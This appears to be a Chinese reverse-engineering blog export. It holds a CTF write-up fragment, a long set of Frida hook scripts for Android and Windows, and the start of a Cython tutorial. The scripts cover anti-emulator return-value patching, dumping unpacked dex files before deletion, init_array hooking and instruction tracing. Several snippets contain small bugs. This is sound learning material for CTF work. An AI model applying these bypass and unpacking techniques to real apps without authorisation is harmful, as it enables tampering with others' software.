^= 0x55;\t\tdata[i] = (data[i] &lt;&lt; 4) | (data[i] &gt;&gt; 4);\t\tdata[i] ^= 0x66;        data[i] ^= i;\t\tprintf(&quot;%c&quot;, data[i]);    &#125;&#125;\n\n\n\nre4\n第一处的逻辑\nvqtbl1q_s8(*(int8x16_t *)&amp;StringUTFChars_1[16 * i], t)对应汇编代码 TBL V0.16B, {V0.16B}, V1.16B；即以v1为索引，在表v0中查找值，放入v0中，这里是128位为一组进行操作，每次操作都是以byte为单位，逻辑大概是\nfor i in range(16):\t\tdata[i] = input[table[i]#逆for i in range(16):\tres[table[i]] = data[i]\n\n再对表进行异或修改,用修改后的表继续下一组操作，一共3组128位数据共48字节。一起的逻辑是\nfor j in range(3):\tfor i in range(16):\t\tdata[i + j*16] = input[table[i]+ j*16]\t\ttable[i] ^= j\n\n下面有个循环位移，后面还有个换表base64解密就行\n#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&quot;base64.h&quot;#include &lt;string.h&gt;int main()&#123;\tint table[] = &#123; 0xD, 0xE, 0xF, 0xC, 0xB, 0xA, 9, 8, 6, 7, 5, 4, 2 ,3, 1, 0 &#125;;    //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/\tunsigned char data[100] = &quot;KJn0QBi+7Zba70HhyITl3Rv1c0K77QrGKIWWI08jStDTK1DLw1fPc1DNk1zRg09P&quot;;    decodeBase64((char*)data, sizeof(data));    //unsigned char data[] = &#123; 0x92,0x33,0x7a,0xa9,0xb2,0x3e,0xe3,0x30,0x40,0xe3,0xa8,0x47,0x62,0x2b,0x4b,0xd2,0xb5,0x7b,0x0b,0xa9,0x38,0xe2,0xa4,0x60,0x92,0x2c,0x30,0x8b,0xae,0x49,0xb1,0x37,0x6d,0x93,0xb7,0x65,0x5b,0xb1,0x69,0x0b,0xb7,0x67,0x2b,0xb6,0x6b,0x1b,0xaf,0x69 &#125;;\t    unsigned char mm[100],res[100];    for (int j = 0; j &lt;= 47; j += 3)    &#123;        data[j] = ((unsigned __int8)data[j] &lt;&lt; 5) | (data[j]&gt;&gt;3);        data[j + 1] = ((unsigned __int8)data[j + 1] &lt;&lt; 1) | (data[j + 1] &gt;&gt; 7);        data[j + 2] = data[j + 2];    &#125;    for (int i = 0; i &lt; 3; i++) &#123;        for (int j = 0; j &lt; 16; j++) &#123;            data[j+i*16] ^= table[j];        &#125;        for (int j = 0; j &lt; 16; j++) &#123;            res[table[j] + i * 16] = data[j + i * 16];            table[j] ^= i;        &#125;    &#125;&#125;\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"frida初步学习","url":"/2024/11/08/frida%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/","content":"JavaScript API 手册 | Frida JavaScript-api 中文手册\nfrida_Android运行frida常用命令运行serveradb push 名 /data/local/tmpadb rootadb shell chmod +x /data/local/tmp/fridaad64adb shell /data/local/tmp/frida-server\n\nspwan启动\nFrida -U -f 包名 -l hookbool.js\n-U 指定USB设备\n-f 用app包名spwn方式启动\n-P 指定APP的pid,先要自行启动\n-pause 暂停\n-l 加载hook脚本\n一些frida方法的收集send(); //发送信息到控制台.\n对hook脚本的初步解析//在启动时就被hook的方法，通常用于绕过反调试，java.perform()是一个frida的接口//几乎一切操作都在这个函数执行Java.perform(function()&#123;      let MainActivity = Java.use(&quot;packname.MainActivity&quot;); //实例化一个类    MainActivity[&quot;isEmu&quot;].implementation = function () &#123;        console.log(`MainActivity.isEmu is called`);        let result = this[&quot;isEmu&quot;]();        console.log(`MainActivity.isEmu result=$&#123;result&#125;`);        return 0;  //一般可以修改返回值如果报错用false，修改返回值    &#125;;    //调用方法并返回值。    MainActivity[&quot;g4tk4y&quot;].implementation = function () &#123;    console.log(`MainActivity.g4tk4y is called`);    let result = this[&quot;g4tk4y&quot;]();    console.log(`MainActivity.g4tk4y result=$&#123;result&#125;`);    return result; //修改返回值&#125;;//java.choose会遍历类的实例，调用方法，用于无法获得实例时动态引用，//修改成员变量。我的理解是寻找一个系统自己的实例，而不是我们自己去实例化。 Java.choose(&quot;packname.MainActivity&quot;,&#123;          onMatch:        function(x)&#123;            console.log(&quot;ok&quot; + x);            let result = x.g4tk4y();            console.log(result);        &#125;,        onComplete: function () &#123;            console.log(&quot;end&quot;);        &#125;&#125;);var MainActivity = Java.use(&quot;packname.MainActivity&quot;);        //overload 选择被重载的对象，funname是方法名,int是要重载的类型        MainActivity.funname.overload(&#x27;int&#x27;).implementation = function (x) &#123;            console.log(&quot;ok&quot; + x);            //可修改结果，另一种修改返回值的方法            var result = &quot;&quot;;            return result;        &#125;;&#125;) function hook() &#123;   //把方法封装为一个函数，在运行起来后可以直接调用执行Java.perform(function()&#123;    let MainActivity = Java.use(&quot;packname.MainActivity&quot;);    MainActivity[&quot;g4tk4y&quot;].implementation = function () &#123;        console.log(`MainActivity.g4tk4y is called`);        let result = this[&quot;g4tk4y&quot;]();        console.log(`MainActivity.g4tk4y result=$&#123;result&#125;`);        return result;        &#125;;    MainActivity.aaa(&quot;x&quot;); //调用函数并传参&#125;)&#125;;(function () &#123;    //（function()&#123;..&#125;)();这样的形式会直接执行函数，                    //以下函数用dia提取，用于hookso层的函数    // @ts-ignore    function print_arg(addr) &#123;        try &#123;            var module = Process.findRangeByAddress(addr);            if (module != null) return &quot;\\n&quot;+hexdump(addr) + &quot;\\n&quot;;            return ptr(addr) + &quot;\\n&quot;;        &#125; catch (e) &#123;            return addr + &quot;\\n&quot;;        &#125;    &#125;    // @ts-ignore    function hook_native_addr(funcPtr, paramsNum) &#123;        var module = Process.findModuleByAddress(funcPtr);        try &#123;            Interceptor.attach(funcPtr, &#123;                onEnter: function (args) &#123;                    this.logs = &quot;&quot;;                    this.params = [];                    // @ts-ignore                    this.logs=this.logs.concat(&quot;So: &quot; + module.name + &quot;  Method: Java_ offset: &quot; + ptr(funcPtr).sub(module.base) + &quot;\\n&quot;);                    for (let i = 0; i &lt; paramsNum; i++) &#123;                        this.params.push(args[i]);                        this.logs=this.logs.concat(&quot;this.args&quot; + i + &quot; onEnter: &quot; + print_arg(args[i]));                    &#125;                &#125;, onLeave: function (retval) &#123;                    for (let i = 0; i &lt; paramsNum; i++) &#123;                        this.logs=this.logs.concat(&quot;this.args&quot; + i + &quot; onLeave: &quot; + print_arg(this.params[i]));                    &#125;                    this.logs=this.logs.concat(&quot;retval onLeave: &quot; + print_arg(retval) + &quot;\\n&quot;);                    console.log(this.logs);                &#125;            &#125;);        &#125; catch (e) &#123;            console.log(e);        &#125;    &#125;    // @ts-ignore    hook_native_addr(Module.findBaseAddress(&quot;libdebugme.so&quot;).add(0xff0), 0x1);&#125;)();//重载函数的其他类型.overload().overload(&#x27;int&#x27;).overload(&#x27;java.lang.Exception&#x27;).overload(&#x27;android.content.Context&#x27;).overload(&#x27;java.lang.String&#x27;).overload(&#x27;android.content.Context&#x27;, &#x27;java.lang.String&#x27;).overload(&#x27;java.io.BufferedInputStream&#x27;, &#x27;java.io.BufferedInputStream&#x27;, &#x27;int&#x27;).overload(&#x27;android.content.Context&#x27;, &#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;)\n\n上面的方法都是被动调用，下面一段脚本是主动调用脚本\nJava.perform(function()&#123;        var main =Java.use(&quot;com.moible.r15.main&quot;).$new();        var input = &quot;66.666s&quot;;        var result = main.getit(input);        console.log(result);    &#125;)\n\n有时候我们想要把一个调用方法封装在一个函数里面，在之后手动调用，然而在我们后面调用时可能会出现报错这个时候我们要使用一下代码使handle能够在别的实例中运行。\n send(Java.available); function get()&#123;    Java.perform(function () &#123;         send(Java.androidVersion);         send(Java.isMainThread());            Java.scheduleOnMainThread(function () &#123;             send(Java.isMainThread());                        var main = Java.use(&quot;com.moible.r15.main&quot;).$new();  //记得实例化new            var input = &quot;66.666s&quot;;  //设置参数            var result = main.getit(input);            console.log(result);               &#125;);    &#125;);&#125;\n\n\nfrida_win_processesfrida可以hookwindows上的的进程，详见功能 |Frida • 世界一流的动态仪表工具包\nfrida -l hook.js -n [name]\n\n这里的name是进程的程序名字。\n简单列出frida的一些process API。参考bbs.kanxue.com&#x2F;article-342.htm\nvar process = Process.findModuleByAddress(address) //根据包含的地址查找模块var process = Process.findModuleByName()  //根据名字查找在内存中的模块(str)-&gt;(模块对象)process.base //模块基地址process.name //模块名process.size //模块大小process.path //模块路径setInterval(f, delay) //每隔delay毫秒调用f,返回一个id，使用clearinterval(id)取消对setIntervar()的调用ptr(addr) //以指针形式调用地址数据hexdump(addr,&#123;offset:0,length:64,header:true,absi:true&#125;) //把一个区域内的内存按格式导出this.context  //访问当前hook的上下文信息，其中this.context.rax可以获取寄存器的值\n\nhook脚本来自Windows | Frida • A world-class dynamic instrumentation toolkit通用脚本\n   //const baseAddr = Module.findBaseAddress(&#x27;Jvm.dll&#x27;); //获取hook对象的拓展模块基地址   //console.log(&#x27;Jvm.dll baseAddr: &#x27; + baseAddr); var process = Process.findModuleByName(&quot;xx.exe&quot;); //以名称获取进程中的模块var baseaddr = process.base      //const f = resolveAddress(&#x27;0x1FF44870&#x27;); //输入函数在ida中显示的地址，获得在内存中的地址   Interceptor.attach(baseaddr.add(0x0000), &#123; // hook函数，函数被调用时执行       // 被hook时打印函数信息       onEnter(args) &#123;           console.log(&#x27;&#x27;);           console.log(&#x27;[+] Called SetAesDeCrypt0&#x27; + f); //被hook的函数地址           console.log(&#x27;[+] Input: &#x27; + args[0]); // 参数args[1],args[2]...           aegs[0] = 111;  //修改参数           dumpAddr(&#x27;Input&#x27;, args[1], args[3].toInt32()); //导出指针参数的数据           this.outptr = args[2]; //保存参数的值以便函数结束时查看           this.outsize = args[3].toInt32();           var rdx=this.context.rdx;  //以上下文获取寄存器的值           console.log(hexdump(ptr(rdx),&#123;length: 16,ansi:true&#125;)); //导出寄存器指向内存的数据       &#125;,       onLeave(retval) &#123;  //函数结束时执行           dumpAddr(&#x27;Output&#x27;, this.outptr, this.outsize); // 获取我们保存的指针参数的值           console.log(&#x27;[+] Returned from setAesDecrypt0: &#x27; + retval);  //函数的返回值       &#125;   &#125;);   function dumpAddr(info, addr, size) &#123; //导出内存数据       if (addr.isNull())           return;       console.log(&#x27;Data dump &#x27; + info + &#x27; :&#x27;);       const buf = addr.readByteArray(size);       // 如果想要色彩高亮，ansi为true       console.log(hexdump(buf, &#123; offset: 0, length: size, header: true, ansi: false &#125;));   &#125;   function resolveAddress(addr) &#123;  //用IDA显示的地址获取当前内存中的地址,其实自己手算偏移也行       const idaBase = ptr(&#x27;0x1FEE0000&#x27;); //输入IDA中显示的基地址，用于计算地址偏移       const offset = ptr(addr).sub(idaBase); //计算地址偏移       const result = baseAddr.add(offset); //计算现在在内存中的地址       console.log(&#x27;[+] New addr=&#x27; + result); // 输出在内存中的地址       return result;   &#125;\n\n手动调用函数\nvar f = new NativeFunction(ptr(addr), &#x27;void&#x27;, [&#x27;int&#x27;]); //函数地址，返回类型，参数类型，调用函数f(1911); //调用函数并串参\n\n实用脚本总结hookjava函数Java.perform(function()&#123; \tlet MainActivity = Java.use(&quot;com.exa.n.MainActivity&quot;);\tMainActivity[&quot;func&quot;].implementation = function (data) &#123;    console.log(`func is called: data=$&#123;data&#125;`);        var result;    result = this[&quot;func&quot;](data);\treturn result;    &#125;;&#125;)function printstack() &#123; //打印堆栈console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Exception&quot;).$new()));&#125;\n\nhooksovar libapp = null;function onLibappLoaded() &#123;    const fn_addr = 0x2FE7F0;       Interceptor.attach(libapp.add(fn_addr), &#123;        onEnter: function () &#123;            var rdi = this.context.rdi;              console.log(rdi)            console.log(hexdump(ptr(rdi), &#123; length: 100, ansi: true &#125;))        &#125;    &#125;);&#125;function tryLoadLibapp() &#123;      libapp = Module.findBaseAddress(&#x27;libapp.so&#x27;);    if (libapp === null)        setTimeout(tryLoadLibapp, 500);    else        onLibappLoaded();&#125;tryLoadLibapp();\n\nwindows一般dump寄存器的值var inter=setInterval(function () &#123;    var process = Process.findModuleByName(&quot;1.exe&quot;);    var baseaddr = process.base    console.log(&quot;base&quot;+baseaddr);    clearInterval(inter);    console.log(hexdump(baseaddr.add(0x005160),&#123;length:255,ansi:true&#125;))        Interceptor.attach(baseaddr.add(0x001E7F), &#123;     onEnter: function (args) &#123;        var rax=this.context.rax;         console.log(&quot;secret&quot; +rax);        console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));    &#125;&#125;),&#125;,1)\n\n修改寄存器的值（用python处理数据）\nfunction hookinput(data)&#123;    var baseaddr = Module.findBaseAddress(&quot;applib.so&quot;);    Interceptor.attach(baseaddr.add(0x001E7F), &#123;         onEnter: function (args) &#123;            var rdi=this.context.rdi;            console.log(&quot;hook&quot; +rdi);            console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));            rdi.writeByteArray(data)            console.log(&quot;edit_after&quot; +rdi);            console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));        &#125;&#125;)    &#125;RTCPeerConnection.export = &#123;    hookinput:hookinput&#125;\n\n\n\nimport timeimport fridaimport sysdef on_message(message, data):    if message[&#x27;type&#x27;] == &#x27;send&#x27;:        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))    else:        print(message)device8 = frida.get_usb_device()pid = device8.spawn(&quot;com.example.aaar&quot;)device8.resume(pid)time.sleep(1)session = device8.attach(pid)with open(&quot;hook.js&quot;) as f:    script = session.create_script(f.read())script.on(&#x27;message&#x27;, on_message)print(&#x27;[*] Hook Start Running&#x27;)script.load()ad = &quot;&quot;.join(&#x27;a&#x27; * 42)test = f&quot;flag&#123;&#123;&#123;ad&#125;&#125;&#125;&quot;input_arr_byte = bytearray(test.encode())data = list(map(int,input_arr_byte))script.export.inputhook(data)\n\n单js脚本处理，适用于简单数据function stringToAsciiArray(str) &#123;    return Array.from(str).map(char =&gt; char.charCodeAt(0));&#125;const input = &quot;flag&#123;&#125;&quot;;const data = stringToAsciiArray(input);function hookinput(data)&#123;    var baseaddr = Module.findBaseAddress(&quot;libflutter.so&quot;);    Interceptor.attach(baseaddr.add(0x001E7F), &#123;         onEnter: function (args) &#123;            var rdi=this.context.rdi;            console.log(&quot;hook&quot; +rdi);            console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));            rdi.writeByteArray(data)            console.log(&quot;edit_after&quot; +rdi);            console.log(hexdump(ptr(rax),&#123;length: 48,ansi:true&#125;));        &#125;&#125;)    &#125;hookinput(data);\n\n文件删除前转移，用于脱壳File.delete.implementation = function() &#123;        var filePath = this.getAbsolutePath();  // 获取文件路径        console.log(&quot;文件将在删除之前被保存: &quot; + filePath);        // 在删除之前复制文件到其他位置        var newFile = Java.use(&#x27;java.io.File&#x27;);        var destPath = &quot;/data/data/com.nobody.zunjia/files/savedDexFile.dex&quot;;  // 新文件路径        var sourceFile = this;        var inputStream = Java.use(&#x27;java.io.FileInputStream&#x27;).$new(sourceFile);        var outputStream = Java.use(&#x27;java.io.FileOutputStream&#x27;).$new(destPath);                var buffer = Java.array(&#x27;byte&#x27;, [1024]);  // 缓冲区        var bytesRead;        while ((bytesRead = inputStream.read(buffer)) !== -1) &#123;            outputStream.write(buffer, 0, bytesRead);        &#125;        inputStream.close();        outputStream.close();        console.log(&quot;文件已保存到: &quot; + destPath);        // 执行原本的删除操作        return this.delete();    &#125;;\n\nhook initarray，替换函数d3ctf的一段模板，\n原理是so的加载流程，liberaryLoad -&gt;liberaryLoad0-&gt;dlopen(android_dlopen_ext)-&gt;__dl__ZN6soinfo17call_constructorsEv。此时so已经加载，然后会执行init_array段。\n//frida version 17.1.0function findSo(name)&#123;    var lib=null;    console.log(`finding $&#123;name&#125;`);    try &#123;        lib = Process.findModuleByName(name)        if (lib === null) &#123;            setTimeout(findSo,200,name);        &#125;        else &#123;            console.log(`found $&#123;name&#125; at $&#123;lib.base&#125;`);            return lib;        &#125;    &#125; catch &#123; &#125;&#125;function hookI(name) &#123;    var lib = findSo(name);    try &#123;        var destFuncAddr = lib.base.add(0x08922A0);        Interceptor.replace(destFuncAddr, new NativeCallback(function () &#123; //替换函数            console.log(`replace: $&#123;name&#125; func: $&#123;destFuncAddr&#125;`);            return 0;        &#125;, &#x27;int&#x27;, []))    &#125; catch &#123; &#125;&#125;function hookInitArray(name) &#123;    var linkermodule = Process.getModuleByName(&quot;linker64&quot;);    var call_function_addr = null;    var symbols = linkermodule.enumerateSymbols();    for (var i = 0; i &lt; symbols.length; i++) &#123;        var symbol = symbols[i];        // console.log(symbol.name);        if (symbol.name.indexOf(&quot;__dl__ZN6soinfo17call_constructorsEv&quot;) != -1) &#123;            call_function_addr = symbol.address;            console.log(&quot;call_function_addr:&quot; + call_function_addr);            Interceptor.attach(call_function_addr, &#123;                onEnter: function (args) &#123;                    console.log(&quot;call_constructors&quot;);                    hookI(name);                &#125;            &#125;)            return;        &#125;    &#125;&#125;hookInitArray(&#x27;libMediaPlayer.so&#x27;);\n\n追踪流程定位函数r3ctf一道题的模板\n//const FUNC_OFFSET = 0x1630  // 1const FUNC_OFFSET = 0x17C0;   // 2//const FUNC_OFFSET = 0x0167B  //3const pow = [0x89, 0xc6, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xe8] //eaxvar powFlag = 0; //4var shift = []; //4 r&gt;&gt;  r&lt;&lt;  l&gt;&gt;  l&lt;&lt;const delta = [0x48, 0x89, 0xc7, 0xff, 0xd1]; //esivar deltaFlag = 0; //1var deltaData = 0;const sbox = [0x89, 0xce, 0x48, 0x89, 0xc7, 0x41, 0xff, 0xd0]; //rax:addr 256*4 bytesvar sboxFlag = 0;var sboxData = [];//ptrfunction matchPattern(code,pattern) &#123;    for (let i = 0; i &lt; pattern.length; i++) &#123;        if (code[i] !== pattern[i]) return false;    &#125;    return true;&#125;const moduleBase = Process.getModuleByName(&quot;beatme&quot;).base;const targetAddr = moduleBase.add(FUNC_OFFSET);console.log(&quot;[*] Waiting to reach function at&quot;, targetAddr);Interceptor.attach(targetAddr, &#123;    onEnter(args) &#123;        try &#123;            console.log(&quot;[+] Entered target function, starting Stalker at&quot;, targetAddr);            console.log(ptr(args[1]))            Stalker.follow(Process.getCurrentThreadId(), &#123;                transform(iterator) &#123;                    let instruction;                    while ((instruction = iterator.next()) !== null) &#123;                        const addr = instruction.address;                        const codeBytes = Memory.readByteArray(addr, 8);                        const code = new Uint8Array(codeBytes);                        // console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                        if ((powFlag &lt; 4) &amp;&amp; matchPattern(code,pow)) &#123;                            console.log(&quot;[*] Match pow found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(powFlag &gt;=4) return;                                var rax = context.rax;                                console.log(`shift: EAX = $&#123;rax.toString(16)&#125;`);                                shift[powFlag++] = rax;                            &#125;)                        &#125;                        else if (!deltaFlag &amp;&amp; matchPattern(code,delta)) &#123;                            console.log(&quot;[*] Match delta found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(deltaFlag != 0) return;                                var rsi = context.rsi;                                console.log(`delta: RSI = $&#123;rsi.toString(16)&#125;`);                                deltaData = rsi;                                deltaFlag++;                            &#125;)                        &#125;                        else if (!sboxFlag &amp;&amp; matchPattern(code,sbox)) &#123;                                                        console.log(&quot;[*] Match sbox found at:&quot;, addr.sub(moduleBase));                            console.log(`[$&#123;addr&#125;] $&#123;instruction&#125;`);                            iterator.putCallout(function (context) &#123;                                if(sboxFlag != 0)return;                                var rax = context.rax;                                console.log(`sbox: RAX = $&#123;rax.toString(16)&#125;`);                                for (let i = 0; i &lt; 256; i++) &#123;                                    const value = Memory.readU32(rax.add(i * 4));                                    sboxData.push(value);                                    sboxFlag++;                                &#125;                            &#125;)                        &#125;                        iterator.keep();                    &#125;                &#125;            &#125;);        &#125; catch (e) &#123;            console.log(e);        &#125;    &#125;,    onLeave: function (args) &#123;    console.log(sboxData)console.log(shift);console.log(deltaData);    &#125;&#125;);\n\n读系统文件function reada()&#123;    var f = File.readAllText(&quot;/proc/self/task&quot;);    console.log(f)&#125;\n\nhook so加载function hook() &#123;    var addr = null;    try &#123;        var module = Process.getModuleByName(&quot;libc.so&quot;);        addr = module.getExportByName(&quot;dlopen&quot;);    &#125; catch (e) &#123;        console.log(e);    &#125;    console.log(&quot;dlopen:&quot;, addr);    Interceptor.attach(addr, &#123;        onEnter: function (args) &#123;            var loadName = args[0].readCString();            console.log(&quot;dlopen: &quot;, loadName);        &#125;,        onLeave: function (retval) &#123;            console.log(&quot;handle:&quot;, retval);        &#125;    &#125;);    var android_dlopen_ext = module.getExportByName(&quot;android_dlopen_ext&quot;);    console.log(&quot;android_dlopen_ext:&quot;, android_dlopen_ext);    Interceptor.attach(android_dlopen_ext, &#123;        onEnter: function (args) &#123;            this.call_hook = false;            var so_name = ptr(args[0]).readCString();            console.log(&quot;android_dlopen_ext:&quot;, so_name);        &#125;,        onLeave: function (retval) &#123; &#125;    &#125;);&#125;\n\n调用native函数，获取缓冲区数据d3ctf一道题的例子\nfunction getpq()&#123;    var libapp = findSo(&quot;libD3piano.so&quot;).base;    const fn_addr = 0x29AA0;    console.log(&quot;hook&quot;+libapp);    Interceptor.attach(libapp.add(fn_addr), &#123;        onEnter: function () &#123;            try&#123;            var x1 = this.context.x1;              var x2 = this.context.x2;            var gmpz_get_str = new NativeFunction(libapp.add(0x5CFD0),&quot;pointer&quot;,[&quot;pointer&quot;,&quot;int&quot;,&quot;pointer&quot;]); //调用native函数            var mallocAddrp = Memory.alloc(0x1000);//构造缓冲区            var mallocAddrq = Memory.alloc(0x1000);            var p = gmpz_get_str(mallocAddrp, 16, x1);            var q = gmpz_get_str(mallocAddrq, 16, x2);            console.log(mallocAddrp.readCString());            console.log(mallocAddrq.readCString());            &#125;catch(e)&#123;                console.log(e);            &#125;        &#125;    &#125;);&#125;\n\n虚拟机操作hookfunction toHexUnsigned(val) &#123;    return &quot;0x&quot; + (val &gt;&gt;&gt; 0).toString(16);&#125;let result = toHexUnsigned(0x38373635 &lt;&lt; 3);console.log(&quot;结果:&quot;, result);  // → 0x1c1b1b28function findSo(name)&#123;    var lib=null;    console.log(`finding $&#123;name&#125;`);    try &#123;        lib = Process.findModuleByName(name)        if (lib === null) &#123;            setTimeout(findSo,200,name);        &#125;        else &#123;            console.log(`found $&#123;name&#125; at $&#123;lib.base&#125;`);            return lib;        &#125;    &#125; catch &#123; &#125;&#125;var tmp =0;function getpq() &#123;    var libapp = findSo(&quot;easyvm.exe&quot;).base;    const fn_addr = 0x1194B;    console.log(&quot;hook&quot; + libapp);    setInterval(() =&gt; &#123;        Interceptor.attach(libapp.add(fn_addr), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rbp;                    var p2var = p2.sub(0x74).readU32();                    tmp = p1;                    console.log(`$&#123;p1&#125; ^ $&#123;p2var&#125; == $&#123;toHexUnsigned(p1 ^ p2var)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        // Interceptor.attach(libapp.add(0x1194e), &#123;        //     onEnter: function () &#123;        //         try &#123;        //             var p1 = this.context.rax;        //             console.log(`2: $&#123;tmp&#125; ^ $&#123;toHexUnsigned(p1 ^ tmp)&#125; == $&#123;toHexUnsigned(p1)&#125;`)        //         &#125; catch (e) &#123;        //             console.log(e);        //         &#125;        //     &#125;        // &#125;);        // 》》        Interceptor.attach(libapp.add(0x1165B), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rdx;                    var p2 = this.context.rcx;                    console.log(`$&#123;p1&#125; &gt;&gt; $&#123;p2&#125; == $&#123;toHexUnsigned(p1 &gt;&gt; p2)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        // 《《        Interceptor.attach(libapp.add(0x115B5), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rdx;                    var p2 = this.context.rcx;                    tmp =p2                    console.log(`$&#123;p1&#125; &lt;&lt; $&#123;p2&#125; == $&#123;toHexUnsigned(p1 &lt;&lt; p2)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        //%        Interceptor.attach(libapp.add(0x10EBC), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rbp;                    var p2var = p2.sub(0x8c).readU32();                    console.log(`$&#123;p1&#125; % $&#123;p2var&#125; == $&#123;toHexUnsigned(p1 % p2var)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        // /        Interceptor.attach(libapp.add(0x10EBC), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rbp;                    var p2var = p2.sub(0x94).readU32();                    console.log(`$&#123;p1&#125; // $&#123;p2var&#125; == $&#123;toHexUnsigned(p1 / p2var)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        // *        Interceptor.attach(libapp.add(0x10D63), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rbp;                    var p2var = p2.sub(0x9c).readU32();                    console.log(`$&#123;p1&#125; * $&#123;p2var&#125; == $&#123;toHexUnsigned(p1 * p2var)&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        // -        Interceptor.attach(libapp.add(0x010CC6 ), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rbp;                    var p2var = p2.sub(0xa4).readU32();                    console.log(`$&#123;p1&#125; - $&#123;p2var&#125; == $&#123;toHexUnsigned(p1.toUInt32() - p2var.toUInt32())&#125;`);                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);        Interceptor.attach(libapp.add(0x10C2A), &#123;            onEnter: function () &#123;                try &#123;                    var p1 = this.context.rax;                    var p2 = this.context.rdx;                    console.log(`$&#123;p1&#125; + $&#123;p2&#125; == $&#123;toHexUnsigned(p1.toUInt32() + p2.toUInt32())&#125;`)                &#125; catch (e) &#123;                    console.log(e);                &#125;            &#125;        &#125;);    &#125;, 500);&#125;getpq();\n\n创建函数（直接返回）function create_fake_pthread_create() &#123;    const fake_pthread_create = Memory.alloc(4096)    Memory.protect(fake_pthread_create, 4096, &quot;rwx&quot;)    Memory.patchCode(fake_pthread_create, 4096, code =&gt; &#123;        const cw = new Arm64Writer(code, &#123; pc: ptr(fake_pthread_create) &#125;)        cw.putRet()    &#125;)    return fake_pthread_create&#125;\n\n创建函数（死锁）function fakePersistentThread() &#123;    const codeAddr = Memory.alloc(0x1000);    Memory.protect(codeAddr, 0x1000, &#x27;rwx&#x27;);    const cw = new Arm64Writer(codeAddr, &#123; pc: codeAddr &#125;);        cw.putBLabel(&#x27;loop&#x27;);    cw.putNop();    cw.putNop();    cw.putBCondLabel(&#x27;al&#x27;,&#x27;loop&#x27;);    return codeAddr;&#125;\n\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"Cython逆向初步学习","url":"/2025/01/16/cython/","content":"我们只进行一些总结，基础理解我参考了这篇文章\nCython编写系统环境:windows，python编译器pycharm(python虚拟环境.venv)，c&#x2F;c++编译器visual stdio 2022\n1.在python中安装cython和setuptools包建议给Cython单独开一个python虚拟环境，有时候包多了导入pyd会报错。\npycharm可以直接使用包管理器搜索安装。\npip install cythonpip install setuptools\n\n2.安装c\\c++编译器我这里用的是visual stdio,也可以用MinGW。\n3.编写cython拓展可以参考用户指南 - 《Cython 3.0 中文文档》 - 书栈网 · BookStack\n随意编写一个source.py作为拓展模块，代码如下\ndef sayhello():    a = &quot;hello world&quot;    print(a)    cdef int add(int n,int m):    return m+ndef aadd(n,m):    print(add(n,m))\n\n还需要一个编译文件，这里我们用myc.py,代码如下\nfrom setuptools import setupfrom Cython.Build import cythonizesetup(ext_modules=cythonize(&quot;source.pyx&quot;,language_level=3))&quot;&quot;&quot;cythonize函数用于把cython编译成c文件setup把c文件生成拓展模块cythonize第一个参数是要编译的pyx或者py文件(与本文件在同一目录下)，language_level=3表示在python3环境下运行，默认python2和3通用&quot;&quot;&quot;\n\n用cmd编译拓展模块\n在上面文件所在目录打开cmd并启动我们的python虚拟环境(不是虚拟环境的跳过)，输入的命令如下，我这里是”E:\\python projects\\cython\\.venv\\Scripts\\activate”\n&quot;项目根目录\\.venv\\Scripts\\activate&quot;\n\n再输入一下命令进行编译,我这里是python myc.py build\npython [编译文件] buildpython [编译文件] build_ext --inplace #这个指令直接把拓展模块放到当前目录而不是build目录\n\n当前目录下的build文件夹中的lib文件夹就是我们的库文件.pyd，我们直使用这个库文件就行，其他的可以删除。把pyd文件放到工作目录下，直接按名字导入即可使用。\n\ncython还可以导入c文件，这个先后面再说吧，好像有点问题\nfrom setuptools import setup, Extensionfrom Cython.Build import cythonizesetup(ext_modules=cythonize(Extension(name=&quot;myc&quot;, sources=[&quot;source.pyx&quot;, &quot;rc4enc.cpp&quot;]),language_level=3))\n\nCython逆向我们自己编译一份cython文件分析，这里我实现了一个RC4加密\nsource.pyx\ndef sayhello():    a = &quot;hello world&quot;    print(a)cdef int add(int n,int m):    return m+ndef aadd(n,m):    print(add(n,m))def rc4():    x=[0x1c,0x05,0x96,0xd3,0xf1,0x62,0x90,0x7d,0x17,0x86,0xd6,0x63,0xd8,0xe2,0x9a,0x93,0x44,0x6b,0xee,0xeb,0x4d,0x6c,0xcc,0x6c,0x38]    key=&#x27;key!key!&#x27;    